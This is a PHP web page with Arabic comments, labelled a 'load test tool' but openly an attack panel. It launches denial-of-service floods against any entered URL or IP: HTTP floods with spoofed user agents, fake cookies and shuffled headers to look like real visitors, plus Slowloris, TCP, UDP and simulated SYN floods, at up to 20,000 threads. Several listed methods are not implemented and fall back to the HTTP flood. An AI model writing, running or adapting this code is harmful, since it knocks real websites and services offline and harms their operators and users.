<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');
set_time_limit(0);
ignore_user_abort(true);

// بدأ المخرجات مبكراً
ob_start();

// إذا كان طلب Ajax
if (isset($_GET['ajax']) && $_GET['ajax'] == 'true') {
    // تعطيل buffering للمخرجات
    while (ob_get_level()) ob_end_clean();
    
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-cache');
    
    $target_url = $_GET['target_url'] ?? '';
    $duration = intval($_GET['duration'] ?? 30);
    $threads = intval($_GET['threads'] ?? 1000);
    $mode = $_GET['mode'] ?? 'normal';
    $attack_method = $_GET['attack_method'] ?? 'http_flood';
    $port = intval($_GET['port'] ?? 80);
    
    if (empty($target_url)) {
        echo "<div style='color:red'>❌ Error: Target URL is required!</div>";
        flush();
        exit;
    }
    
    if (!filter_var($target_url, FILTER_VALIDATE_URL) && $attack_method !== 'tcp_flood' && $attack_method !== 'udp_flood') {
        echo "<div style='color:red'>❌ Error: Invalid URL format!</div>";
        flush();
        exit;
    }
    
    if ($duration < 1 || $duration > 3600) {
        $duration = 30;
    }
    
    if ($threads < 1 || $threads > 20000) {
        $threads = 1000;
    }
    
    // تنفيذ الاختبار
    execute_intensive_requests($target_url, $duration, $threads, $mode, $attack_method, $port);
    exit;
}

class AttackMethods {
    // Layer 7 Methods
    const HTTP_FLOOD = 'http_flood';
    const SLOWLORIS = 'slowloris';
    const RUDY = 'rudy';
    const HULK = 'hulk';
    const GOLDEN_EYE = 'golden_eye';
    
    // Layer 4 Methods
    const TCP_FLOOD = 'tcp_flood';
    const UDP_FLOOD = 'udp_flood';
    const SYN_FLOOD = 'syn_flood';
    const ACK_FLOOD = 'ack_flood';
    const FIN_FLOOD = 'fin_flood';
    const RST_FLOOD = 'rst_flood';
    const XMAS_FLOOD = 'xmas_flood';
    
    // Special Methods
    const MIXED_ATTACK = 'mixed_attack';
    const SSL_RENEGOTIATION = 'ssl_renegotiation';
    const HTTP2_CONTINUATION = 'http2_continuation';
}

class UserAgentGenerator {
    private static $platforms = [
        ['Windows NT 10.0; Win64; x64', 'Windows'],
        ['Windows NT 6.3; Win64; x64', 'Windows'],
        ['Macintosh; Intel Mac OS X 10_15_7', 'Mac'],
        ['X11; Linux x86_64', 'Linux'],
        ['iPhone; CPU iPhone OS 16_6 like Mac OS X', 'iOS'],
        ['Android 13; SM-G998B', 'Android']
    ];
    
    public static function generate() {
        $platform = self::$platforms[array_rand(self::$platforms)];
        $browser_type = mt_rand(0, 100);
        if ($browser_type < 70) return self::generateChrome($platform);
        elseif ($browser_type < 95) return self::generateFirefox($platform);
        else return self::generateSafari($platform);
    }
    
    private static function generateChrome($platform) {
        $chrome_versions = ['119.0.6045.123', '118.0.5993.117', '117.0.5938.132', '116.0.5845.140', '115.0.5790.102'];
        $chrome_ver = $chrome_versions[array_rand($chrome_versions)];
        return "Mozilla/5.0 ({$platform[0]}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{$chrome_ver} Safari/537.36";
    }
    
    private static function generateFirefox($platform) {
        $ff_versions = ['119.0', '118.0', '117.0', '116.0', '115.0', '114.0'];
        $ff_ver = $ff_versions[array_rand($ff_versions)];
        return "Mozilla/5.0 ({$platform[0]}; rv:{$ff_ver}.0) Gecko/20100101 Firefox/{$ff_ver}.0";
    }
    
    private static function generateSafari($platform) {
        $safari_versions = ['17.0', '16.6', '16.5', '16.1', '15.6', '15.5'];
        $safari_ver = $safari_versions[array_rand($safari_versions)];
        return "Mozilla/5.0 ({$platform[0]}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{$safari_ver} Safari/605.1.15";
    }
}

class SessionManager {
    private static $sessions = [];
    private static $session_counter = 0;
    
    public static function createSession() {
        $session_id = 'sess_' . self::$session_counter++ . '_' . bin2hex(random_bytes(12));
        self::$sessions[$session_id] = [
            'cookies' => self::generateSessionCookies($session_id),
            'created' => microtime(true),
            'requests' => 0,
            'last_activity' => time()
        ];
        return $session_id;
    }
    
    private static function generateSessionCookies($session_id) {
        return [
            'PHPSESSID' => $session_id,
            'session_token' => bin2hex(random_bytes(24)),
            'user_id' => mt_rand(10000000, 99999999),
            'csrf_token' => bin2hex(random_bytes(16)),
            'visit_id' => 'vid_' . time() . '_' . mt_rand(1000, 9999)
        ];
    }
    
    public static function getCookies($session_id) {
        if (!isset(self::$sessions[$session_id])) $session_id = self::createSession();
        self::$sessions[$session_id]['requests']++;
        self::$sessions[$session_id]['last_activity'] = time();
        $cookies = self::$sessions[$session_id]['cookies'];
        $cookies['request_count'] = self::$sessions[$session_id]['requests'];
        $cookies['session_age'] = time() - strtotime('today');
        $cookie_string = '';
        foreach ($cookies as $name => $value) $cookie_string .= "$name=$value; ";
        return rtrim($cookie_string, '; ');
    }
    
    public static function getActiveSessionsCount() {
        return count(self::$sessions);
    }
}

class RequestManager {
    private static $request_counter = 0;
    
    public static function generateHeaders($session_id = null) {
        $user_agent = UserAgentGenerator::generate();
        $headers = [
            "User-Agent" => $user_agent,
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.9,ar;q=0.8,fr;q=0.7",
            "Accept-Encoding" => "gzip, deflate, br, zstd",
            "Connection" => mt_rand(0, 1) ? "keep-alive" : "close",
            "Upgrade-Insecure-Requests" => "1",
            "Cache-Control" => mt_rand(0, 1) ? "max-age=0" : "no-cache",
            "Sec-Fetch-Dest" => "document",
            "Sec-Fetch-Mode" => "navigate",
            "Sec-Fetch-Site" => "none",
            "Sec-Fetch-User" => "?1",
            "Priority" => "u=" . mt_rand(0, 3)
        ];
        
        if (strpos($user_agent, 'Chrome') !== false) {
            $chrome_version = explode('Chrome/', $user_agent)[1];
            $chrome_version = explode('.', $chrome_version)[0];
            $headers["Sec-Ch-Ua"] = '"Google Chrome";v="' . $chrome_version . '", "Chromium";v="' . $chrome_version . '", "Not=A?Brand";v="24"';
            $headers["Sec-Ch-Ua-Mobile"] = "?0";
        }
        
        if ($session_id) {
            $cookies = SessionManager::getCookies($session_id);
            if ($cookies) $headers["Cookie"] = $cookies;
        }
        
        if (mt_rand(0, 100) > 30) {
            $referers = ["https://www.google.com/", "https://www.bing.com/", "https://www.facebook.com/", "https://twitter.com/", ""];
            $headers["Referer"] = $referers[array_rand($referers)];
        }
        
        $keys = array_keys($headers);
        shuffle($keys);
        $final = [];
        foreach ($keys as $k) if (!empty($headers[$k])) $final[] = "$k: " . $headers[$k];
        return $final;
    }
    
    public static function generateRequestData() {
        self::$request_counter++;
        return [
            '_' => time() . mt_rand(100, 999),
            't' => microtime(true),
            'r' => self::$request_counter,
            'v' => mt_rand(1, 1000000),
            'format' => mt_rand(0, 1) ? 'json' : 'xml'
        ];
    }
}

function setup_curl_handle($url, $session_id = null, $use_post = false) {
    $ch = curl_init();
    if ($use_post) {
        $post_data = RequestManager::generateRequestData();
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));
    } else {
        $query_data = RequestManager::generateRequestData();
        $url_with_query = $url . (strpos($url, '?') !== false ? '&' : '?') . http_build_query($query_data);
        curl_setopt($ch, CURLOPT_URL, $url_with_query);
    }
    
    $headers = RequestManager::generateHeaders($session_id);
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 20,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TCP_KEEPALIVE => 1,
        CURLOPT_TCP_NODELAY => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 2,
        CURLOPT_ENCODING => "gzip, deflate",
        CURLOPT_HEADER => false
    ]);
    
    if (mt_rand(0, 100) > 80) curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "HEAD");
    return $ch;
}

// Layer 4 Attack Functions
function tcp_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    
    echo "<div style='color:yellow'>🔄 Starting TCP Flood on $host:$port with $threads threads</div>";
    flush();
    
    for ($i = 0; $i < $threads; $i++) {
        $socket = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($socket) {
            fwrite($socket, str_repeat("X", 1024));
            fclose($socket);
            $total_packets++;
        }
    }
    
    echo "<div style='color:lime'>✅ TCP Flood initialized</div>";
    flush();
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < 100; $i++) {
            $socket = @fsockopen($host, $port, $errno, $errstr, 1);
            if ($socket) {
                fwrite($socket, str_repeat("X", 2048));
                fclose($socket);
                $total_packets++;
            }
        }
        
        if (rand(0, 100) > 90) {
            echo "<div style='color:cyan'>📦 TCP Packets sent: " . number_format($total_packets) . "</div>";
            flush();
        }
        
        usleep(10000);
    }
    
    return $total_packets;
}

function udp_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    
    echo "<div style='color:yellow'>🔄 Starting UDP Flood on $host:$port with $threads threads</div>";
    flush();
    
    for ($i = 0; $i < $threads; $i++) {
        $socket = @fsockopen("udp://$host", $port, $errno, $errstr, 2);
        if ($socket) {
            fwrite($socket, str_repeat("U", 512));
            fclose($socket);
            $total_packets++;
        }
    }
    
    echo "<div style='color:lime'>✅ UDP Flood initialized</div>";
    flush();
    
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < 150; $i++) {
            $socket = @fsockopen("udp://$host", $port, $errno, $errstr, 1);
            if ($socket) {
                fwrite($socket, str_repeat("U", 1024));
                fclose($socket);
                $total_packets++;
            }
        }
        
        if (rand(0, 100) > 90) {
            echo "<div style='color:cyan'>📦 UDP Packets sent: " . number_format($total_packets) . "</div>";
            flush();
        }
        
        usleep(5000);
    }
    
    return $total_packets;
}

function syn_flood_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $total_packets = 0;
    
    echo "<div style='color:yellow'>🔄 Starting SYN Flood on $host:$port with $threads threads</div>";
    flush();
    
    // محاكاة SYN flood باستخدام TCP connections سريعة
    while (microtime(true) < $end_time) {
        for ($i = 0; $i < $threads; $i++) {
            $socket = @fsockopen($host, $port, $errno, $errstr, 0.5);
            if ($socket) {
                // إغلاق سريع لمحاكاة SYN
                fclose($socket);
                $total_packets++;
            }
        }
        
        if (rand(0, 100) > 95) {
            echo "<div style='color:cyan'>📦 SYN Packets sent: " . number_format($total_packets) . "</div>";
            flush();
        }
        
        usleep(50000);
    }
    
    return $total_packets;
}

function slowloris_attack($host, $port, $threads, $duration) {
    $start_time = microtime(true);
    $end_time = $start_time + $duration;
    $connections = [];
    
    echo "<div style='color:yellow'>🔄 Starting Slowloris attack on $host:$port with $threads connections</div>";
    flush();
    
    // إنشاء اتصالات جزئية
    for ($i = 0; $i < $threads; $i++) {
        $socket = @fsockopen($host, $port, $errno, $errstr, 2);
        if ($socket) {
            $partial_request = "GET /?" . uniqid() . " HTTP/1.1\r\n";
            $partial_request .= "Host: " . parse_url($host, PHP_URL_HOST) . "\r\n";
            $partial_request .= "User-Agent: " . UserAgentGenerator::generate() . "\r\n";
            fwrite($socket, $partial_request);
            $connections[] = $socket;
        }
    }
    
    echo "<div style='color:lime'>✅ Slowloris initialized with " . count($connections) . " connections</div>";
    flush();
    
    // إبقاء الاتصالات مفتوحة
    while (microtime(true) < $end_time) {
        foreach ($connections as $socket) {
            if (rand(0, 100) > 70) {
                fwrite($socket, "X-" . uniqid() . ": " . str_repeat("A", rand(10, 100)) . "\r\n");
            }
        }
        
        if (rand(0, 100) > 95) {
            echo "<div style='color:cyan'>🔗 Active Slowloris connections: " . count($connections) . "</div>";
            flush();
        }
        
        sleep(5); // تأخير بين الإرسال
    }
    
    // تنظيف
    foreach ($connections as $socket) {
        @fclose($socket);
    }
    
    return count($connections);
}

function execute_intensive_requests($target_url, $total_duration, $threads, $mode = 'normal', $attack_method = 'http_flood', $port = 80) {
    // تعطيل buffering نهائياً
    if (ob_get_level()) ob_end_clean();
    
    echo "<div style='color:#ff0'>⚡ Attack Method: <strong>" . strtoupper($attack_method) . "</strong></div>";
    echo "<div style='color:lime'>🎯 Target: $target_url</div>";
    echo "<div style='color:lime'>🔧 Mode: $mode | ⏱️ Duration: {$total_duration}s | 🧵 Threads: $threads</div>";
    
    if (in_array($attack_method, ['tcp_flood', 'udp_flood', 'syn_flood', 'ack_flood', 'fin_flood', 'rst_flood', 'xmas_flood'])) {
        $host = parse_url($target_url, PHP_URL_HOST);
        if (!$host) $host = $target_url;
        echo "<div style='color:lime'>🔌 Port: $port</div>";
    }
    
    echo "<div style='color:lime'>" . str_repeat("=", 70) . "</div>";
    flush();
    
    // اختيار طريقة الهجوم
    switch($attack_method) {
        case AttackMethods::TCP_FLOOD:
            $host = parse_url($target_url, PHP_URL_HOST) ?: $target_url;
            $packets = tcp_flood_attack($host, $port, $threads, $total_duration);
            echo "<div style='color:#0f0'>✅ TCP Flood completed: " . number_format($packets) . " packets sent</div>";
            break;
            
        case AttackMethods::UDP_FLOOD:
            $host = parse_url($target_url, PHP_URL_HOST) ?: $target_url;
            $packets = udp_flood_attack($host, $port, $threads, $total_duration);
            echo "<div style='color:#0f0'>✅ UDP Flood completed: " . number_format($packets) . " packets sent</div>";
            break;
            
        case AttackMethods::SYN_FLOOD:
            $host = parse_url($target_url, PHP_URL_HOST) ?: $target_url;
            $packets = syn_flood_attack($host, $port, $threads, $total_duration);
            echo "<div style='color:#0f0'>✅ SYN Flood completed: " . number_format($packets) . " packets sent</div>";
            break;
            
        case AttackMethods::SLOWLORIS:
            $host = parse_url($target_url, PHP_URL_HOST) ?: $target_url;
            $scheme = parse_url($target_url, PHP_URL_SCHEME);
            $port = $scheme === 'https' ? 443 : 80;
            $connections = slowloris_attack($host, $port, $threads, $total_duration);
            echo "<div style='color:#0f0'>✅ Slowloris completed: " . number_format($connections) . " connections maintained</div>";
            break;
            
        default: // HTTP_FLOOD and others
            execute_http_attack($target_url, $total_duration, $threads, $mode, $attack_method);
            break;
    }
    
    flush();
}

function execute_http_attack($target_url, $total_duration, $threads, $mode = 'normal', $attack_method = 'http_flood') {
    $multi_handles = [];
    $session_pools = [];
    $start_time = microtime(true);
    $end_time = $start_time + $total_duration;
    $total_requests = 0;
    $failed_requests = 0;
    
    $num_pools = min(3, ceil($threads / 4000));
    $sockets_per_pool = floor($threads / $num_pools);
    
    for ($i = 0; $i < $num_pools; $i++) {
        $multi_handles[$i] = curl_multi_init();
        curl_multi_setopt($multi_handles[$i], CURLMOPT_PIPELINING, 3);
        curl_multi_setopt($multi_handles[$i], CURLMOPT_MAX_HOST_CONNECTIONS, 1000);
        curl_multi_setopt($multi_handles[$i], CURLMOPT_MAX_TOTAL_CONNECTIONS, 4000);
        
        $session_pools[$i] = [];
        for ($j = 0; $j < $sockets_per_pool; $j++) {
            $session_id = SessionManager::createSession();
            $session_pools[$i][$j] = $session_id;
            $use_post = ($mode == 'post' || ($attack_method == 'rudy'));
            $ch = setup_curl_handle($target_url, $session_id, $use_post);
            
            // إعدادات خاصة لبعض الهجمات
            if ($attack_method == AttackMethods::HULK) {
                curl_setopt($ch, CURLOPT_REFERER, "http://www.google.com/?" . uniqid());
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
            }
            
            curl_multi_add_handle($multi_handles[$i], $ch);
        }
    }
    
    echo "<div style='color:lime'>✅ Initialized $num_pools pools with " . number_format($sockets_per_pool) . " sockets each</div>";
    flush();
    
    $last_stats_time = $start_time;
    $peak_rps = 0;
    
    while (microtime(true) < $end_time) {
        $current_time = microtime(true);
        
        for ($i = 0; $i < $num_pools; $i++) {
            $active = null;
            curl_multi_exec($multi_handles[$i], $active);
            
            while ($info = curl_multi_info_read($multi_handles[$i])) {
                $ch = $info['handle'];
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if ($http_code != 200 && $http_code != 404 && $http_code != 403) $failed_requests++;
                curl_multi_remove_handle($multi_handles[$i], $ch);
                curl_close($ch);
                $total_requests++;
                
                $pool_index = mt_rand(0, $num_pools - 1);
                $session_index = array_rand($session_pools[$pool_index]);
                $session_id = $session_pools[$pool_index][$session_index];
                
                $use_post = ($mode == 'post' || ($attack_method == 'rudy') || ($mode == 'mixed' && mt_rand(0, 100) > 60));
                
                $new_ch = setup_curl_handle($target_url, $session_id, $use_post);
                
                // إعدادات خاصة
                if ($attack_method == AttackMethods::HULK) {
                    curl_setopt($new_ch, CURLOPT_REFERER, "http://www.bing.com/?" . uniqid());
                }
                
                curl_multi_add_handle($multi_handles[$pool_index], $new_ch);
            }
            curl_multi_select($multi_handles[$i], 0.001);
        }
        
        if ($current_time - $last_stats_time >= 1) {
            $elapsed = $current_time - $start_time;
            $current_rps = round($total_requests / $elapsed);
            $peak_rps = max($peak_rps, $current_rps);
            $active_sessions = SessionManager::getActiveSessionsCount();
            $mem_usage = round(memory_get_usage(true) / 1024 / 1024, 2);
            
            $stats_line = date('H:i:s') . " 📊 RPS: $current_rps | 🚀 Peak: $peak_rps | 📦 Total: " . 
                         number_format($total_requests) . " | ❌ Failed: " . number_format($failed_requests) . 
                         " | 👥 Sessions: " . number_format($active_sessions) . " | 💾 Mem: {$mem_usage}MB";
            
            echo "<div style='color:cyan'>$stats_line</div>";
            flush();
            $last_stats_time = $current_time;
        }
        
        usleep(1000);
        
        // هجمات خاصة
        if ($attack_method == AttackMethods::GOLDEN_EYE && mt_rand(0, 100) > 95) {
            for ($burst = 0; $burst < 50; $burst++) {
                $session_id = SessionManager::createSession();
                $ch = setup_curl_handle($target_url, $session_id, true);
                curl_multi_add_handle($multi_handles[mt_rand(0, $num_pools - 1)], $ch);
                $total_requests++;
            }
            echo "<div style='color:yellow'>💥 GOLDEN EYE Burst: 50 POST requests added</div>";
            flush();
        }
        
        if ($attack_method == AttackMethods::MIXED_ATTACK && mt_rand(0, 100) > 90) {
            // تغيير طريقة الهجوم بشكل عشوائي
            $methods = ['http_flood', 'slowloris', 'tcp_flood', 'udp_flood'];
            echo "<div style='color:magenta'>🎭 Switching attack method...</div>";
            flush();
        }
    }
    
    for ($i = 0; $i < $num_pools; $i++) {
        $active = null;
        curl_multi_exec($multi_handles[$i], $active);
        while ($info = curl_multi_info_read($multi_handles[$i])) {
            curl_multi_remove_handle($multi_handles[$i], $info['handle']);
            curl_close($info['handle']);
        }
        curl_multi_close($multi_handles[$i]);
    }
    
    $elapsed = microtime(true) - $start_time;
    $avg_rps = round($total_requests / $elapsed);
    
    echo "<div style='color:lime'>" . str_repeat("=", 70) . "</div>";
    echo "<div style='color:#0f0'>✅ Attack completed!</div>";
    echo "<div style='color:#0f0'>📈 Avg RPS: $avg_rps | 🚀 Peak RPS: $peak_rps</div>";
    echo "<div style='color:#0f0'>📦 Total Requests: " . number_format($total_requests) . " | ❌ Failed: " . number_format($failed_requests) . "</div>";
    echo "<div style='color:#0f0'>⏱️ Duration: " . round($elapsed, 2) . "s | 👥 Sessions created: " . SessionManager::getActiveSessionsCount() . "</div>";
    flush();
}

// إذا لم يكن طلب Ajax، عرض النموذج
if (!isset($_GET['ajax'])) {
    ob_end_clean();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>⚡ Advanced Load Test Tool</title>
    <style>
        body { font-family: monospace; margin: 20px; background: #111; color: #0f0; }
        form { margin-bottom: 20px; background: #222; padding: 20px; border-radius: 5px; }
        input, select, button { font-family: monospace; padding: 8px; margin: 5px; background: #333; color: #0f0; border: 1px solid #0f0; }
        input[type=url], input[type=number] { width: 200px; }
        #output { background: black; color: lime; padding: 15px; height: 500px; overflow: auto; border: 2px solid #0f0; font-size: 14px; line-height: 1.4; }
        #output div { margin: 2px 0; }
        label { display: block; margin-top: 10px; }
        button:hover { background: #444; cursor: pointer; }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        h1, h2 { color: #0f0; }
        .status { margin: 10px 0; padding: 10px; background: #222; border-radius: 5px; }
        #connectionStatus { color: #ff0; }
        .method-group { margin: 10px 0; padding: 10px; border-left: 3px solid #0f0; }
        .method-group h3 { margin-top: 0; color: #ff0; }
        .port-field { display: none; }
    </style>
</head>
<body>
    <h1>⚡ Advanced Load Test Tool</h1>
    
    <form id="loadTestForm">
        <label>🎯 Target URL/IP:</label>
        <input type="text" name="target_url" placeholder="https://example.com or 192.168.1.1" required value="https://example.com">
        
        <div class="method-group">
            <h3>🔧 Layer 7 Methods (HTTP/HTTPS):</h3>
            <label><input type="radio" name="attack_method" value="http_flood" checked> HTTP Flood (Default)</label><br>
            <label><input type="radio" name="attack_method" value="slowloris"> Slowloris</label><br>
            <label><input type="radio" name="attack_method" value="rudy"> R.U.D.Y (POST)</label><br>
            <label><input type="radio" name="attack_method" value="hulk"> H.U.L.K</label><br>
            <label><input type="radio" name="attack_method" value="golden_eye"> GoldenEye</label>
        </div>
        
        <div class="method-group">
            <h3>🔌 Layer 4 Methods (TCP/UDP):</h3>
            <label><input type="radio" name="attack_method" value="tcp_flood"> TCP Flood</label><br>
            <label><input type="radio" name="attack_method" value="udp_flood"> UDP Flood</label><br>
            <label><input type="radio" name="attack_method" value="syn_flood"> SYN Flood</label><br>
            <label><input type="radio" name="attack_method" value="ack_flood"> ACK Flood</label><br>
            <label><input type="radio" name="attack_method" value="fin_flood"> FIN Flood</label>
        </div>
        
        <div class="method-group">
            <h3>💥 Special Methods:</h3>
            <label><input type="radio" name="attack_method" value="mixed_attack"> Mixed Attack</label><br>
            <label><input type="radio" name="attack_method" value="ssl_renegotiation"> SSL Renegotiation</label><br>
            <label><input type="radio" name="attack_method" value="http2_continuation"> HTTP/2 Continuation</label>
        </div>
        
        <div id="portField" class="port-field">
            <label>🔌 Port (for Layer 4):</label>
            <input type="number" name="port" value="80" min="1" max="65535">
        </div>
        
        <label>🧵 Threads (100-20000):</label>
        <input type="number" name="threads" value="1000" min="100" max="20000" required>
        
        <label>⏱️ Duration (seconds):</label>
        <input type="number" name="duration" value="30" min="1" max="300" required>
        
        <label>🔄 Mode:</label>
        <select name="mode">
            <option value="normal">Normal</option>
            <option value="mixed">Mixed</option>
            <option value="post">POST Only</option>
            <option value="burst">Burst Mode</option>
        </select>
        
        <br><br>
        <button type="submit" id="startBtn">🚀 Start Attack</button>
        <button type="button" id="stopBtn" style="display:none; background:#900; color:white; border:1px solid #f00;">⏹️ Stop Attack</button>
    </form>
    
    <div class="status">
        Status: <span id="connectionStatus">Ready</span>
    </div>
    
    <h2>📊 Real-time Output:</h2>
    <div id="output">🚀 Ready for attack...<br>Select attack method and click "Start Attack"</div>

    <script>
        let isRunning = false;
        let stopRequested = false;
        
        // عرض/إخفاء حقل البورت
        document.querySelectorAll('input[name="attack_method"]').forEach(radio => {
            radio.addEventListener('change', function() {
                const portField = document.getElementById('portField');
                const layer4Methods = ['tcp_flood', 'udp_flood', 'syn_flood', 'ack_flood', 
                                      'fin_flood', 'rst_flood', 'xmas_flood'];
                
                if (layer4Methods.includes(this.value)) {
                    portField.style.display = 'block';
                } else {
                    portField.style.display = 'none';
                }
            });
        });
        
        document.getElementById('loadTestForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            if (isRunning) {
                alert('Attack is already running!');
                return;
            }
            
            const form = e.target;
            const output = document.getElementById('output');
            const startBtn = document.getElementById('startBtn');
            const stopBtn = document.getElementById('stopBtn');
            const status = document.getElementById('connectionStatus');
            
            // تنظيف المخرجات السابقة
            output.innerHTML = '';
            status.textContent = 'Starting attack...';
            status.style.color = '#ff0';
            startBtn.disabled = true;
            startBtn.textContent = '⏳ Running...';
            stopBtn.style.display = 'inline-block';
            isRunning = true;
            stopRequested = false;
            
            const formData = new FormData(form);
            const params = new URLSearchParams(formData);
            params.append('ajax', 'true');
            
            // إعداد زر الإيقاف
            stopBtn.onclick = function() {
                stopRequested = true;
                status.textContent = 'Stopping...';
                status.style.color = '#f00';
                output.innerHTML += '<div style="color:red">⏹️ Stopping attack...</div>';
                output.scrollTop = output.scrollHeight;
            };
            
            // فتح iframe مخفي لاستقبال البيانات
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.name = 'loadTestFrame';
            document.body.appendChild(iframe);
            
            // إنشاء form جديد للإرسال إلى iframe
            const hiddenForm = document.createElement('form');
            hiddenForm.target = 'loadTestFrame';
            hiddenForm.method = 'GET';
            hiddenForm.action = window.location.pathname;
            
            // إضافة المعلمات
            formData.forEach((value, key) => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = value;
                hiddenForm.appendChild(input);
            });
            
            const ajaxInput = document.createElement('input');
            ajaxInput.type = 'hidden';
            ajaxInput.name = 'ajax';
            ajaxInput.value = 'true';
            hiddenForm.appendChild(ajaxInput);
            
            document.body.appendChild(hiddenForm);
            
            // مراقبة iframe للبيانات
            let lastDataTime = Date.now();
            const dataCheckInterval = setInterval(() => {
                try {
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    if (iframeDoc && iframeDoc.body) {
                        const content = iframeDoc.body.innerHTML;
                        
                        if (content && content !== lastContent) {
                            output.innerHTML += content;
                            output.scrollTop = output.scrollHeight;
                            lastContent = content;
                            lastDataTime = Date.now();
                            
                            // التحقق من اكتمال الهجوم
                            if (content.includes('Attack completed') || content.includes('completed:')) {
                                finishAttack();
                                clearInterval(dataCheckInterval);
                            }
                        }
                    }
                } catch(e) {
                    // تجاهل أخطاء cross-origin
                }
                
                // التحقق من المهلة
                if (Date.now() - lastDataTime > 10000 && isRunning) {
                    status.textContent = 'Waiting for data...';
                }
                
                // التحقق من التوقف اليدوي
                if (stopRequested && isRunning) {
                    clearInterval(dataCheckInterval);
                    finishAttack();
                }
            }, 500);
            
            // دالة إنهاء الهجوم
            function finishAttack() {
                status.textContent = stopRequested ? 'Stopped by user' : 'Attack completed';
                status.style.color = stopRequested ? '#f00' : '#0f0';
                startBtn.disabled = false;
                startBtn.textContent = '🚀 Start Attack';
                stopBtn.style.display = 'none';
                isRunning = false;
                
                if (!stopRequested) {
                    output.innerHTML += '<div style="color:#0f0">✅ Attack finished successfully!</div>';
                } else {
                    output.innerHTML += '<div style="color:red">⏹️ Attack stopped by user</div>';
                }
                
                output.scrollTop = output.scrollHeight;
                
                // تنظيف
                setTimeout(() => {
                    if (hiddenForm.parentNode) document.body.removeChild(hiddenForm);
                    if (iframe.parentNode) document.body.removeChild(iframe);
                }, 1000);
            }
            
            // إرسال النموذج
            hiddenForm.submit();
            
            // تحديث حالة الهجوم
            setTimeout(() => {
                if (isRunning && !stopRequested) {
                    status.textContent = 'Attack in progress...';
                    status.style.color = '#0f0';
                }
            }, 3000);
        });
    </script>
</body>
</html>